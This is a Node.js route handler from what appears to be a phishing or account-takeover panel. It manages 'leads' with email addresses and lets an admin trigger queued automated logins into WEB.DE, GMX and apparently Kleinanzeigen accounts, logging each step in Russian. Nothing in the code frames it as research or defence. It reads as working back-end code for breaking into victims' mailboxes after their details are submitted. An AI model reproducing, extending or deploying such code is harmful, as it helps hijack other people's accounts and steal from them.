'use strict';

const { send } = require('../../utils/httpUtils');
const { checkAdminAuth, checkWorkerSecret } = require('../../utils/authUtils');
const { eventLabelIsMailboxAutoStart, eventLabelIsMailboxAutoQueue } = require('../../utils/formatUtils');
const leadService = require('../../services/leadService');
const automationService = require('../../services/automationService');

async function handle(scope) {
  const req = scope.req;
  const res = scope.res;
  const pathname = scope.pathname;

  if (pathname === '/api/webde-login-grid-step' && req.method === 'POST') {
    if (!checkWorkerSecret(req, res)) return true;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      const stepPatch = {};
      if (json.step === null || json.step === undefined || json.step === '') {
        stepPatch.webdeLoginGridStep = null;
      } else {
        const n = parseInt(json.step, 10);
        if (!Number.isFinite(n) || n < 0) return send(res, 400, { ok: false, error: 'step must be non-negative integer' });
        stepPatch.webdeLoginGridStep = String(n);
      }
      try {
        if (!leadService.persistLeadPatch(id, stepPatch)) return send(res, 500, { ok: false, error: 'write error' });
      } catch (e) {
        console.error('[SERVER] webde-login-grid-step leadService.persistLeadPatch:', e);
        return send(res, 500, { ok: false, error: 'write error' });
      }
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/webde-login-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return true;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id && String(json.id).trim();
      if (!idRaw) {
        console.error('[АДМИН] webde-login-start: не передан id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const id = leadService.resolveLeadId(idRaw);
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[АДМИН] webde-login-start: лид не найден, id=' + id + (id !== idRaw ? ' (resolved from ' + idRaw + ')' : ''));
        return send(res, 404, { ok: false });
      }
      const emailLog = (lead.emailKl || lead.email || '').trim() || '—';
      scope.pushEvent(lead, 'Автовход: ручной запуск (кнопка)', 'admin');
      leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
      scope.logTerminalFlow('АДМИН', 'Админ', 'manual', emailLog, 'ручной запуск автовхода requested · leadId=' + id, id);

      // Запуск через общий путь авто-логина: те же очереди, слоты и ветки (WEB.DE/GMX/Klein-orchestration).
      automationService.startWebdeLoginAfterLeadSubmit(id, lead, true);

      const live = leadService.readLeadById(id) || lead;
      const evs = Array.isArray(live.eventTerminal) ? live.eventTerminal : [];
      const nowTs = Date.now();
      const freshAutoEvent = evs.slice(-6).find(function (ev) {
        const label = String((ev && ev.label) || '');
        if (!eventLabelIsMailboxAutoStart(label) && !eventLabelIsMailboxAutoQueue(label)) return false;
        const atTs = Date.parse((ev && ev.at) || '');
        return Number.isFinite(atTs) ? (nowTs - atTs <= 8000) : true;
      });
      if (!freshAutoEvent) {
        scope.pushEvent(live, 'Автовход: ручной запуск отклонён', 'admin');
        leadService.persistLeadPatch(id, { eventTerminal: live.eventTerminal });
        return send(res, 409, { ok: false, error: 'Автовход не запущен (уже запущен, отключён Auto-Login или не подходит сценарий лида)' });
      }
      send(res, 200, { ok: true, message: eventLabelIsMailboxAutoQueue(freshAutoEvent.label) ? 'queued' : 'started' });
    });
    return true;
  }

  return false;
}

module.exports = { handle };
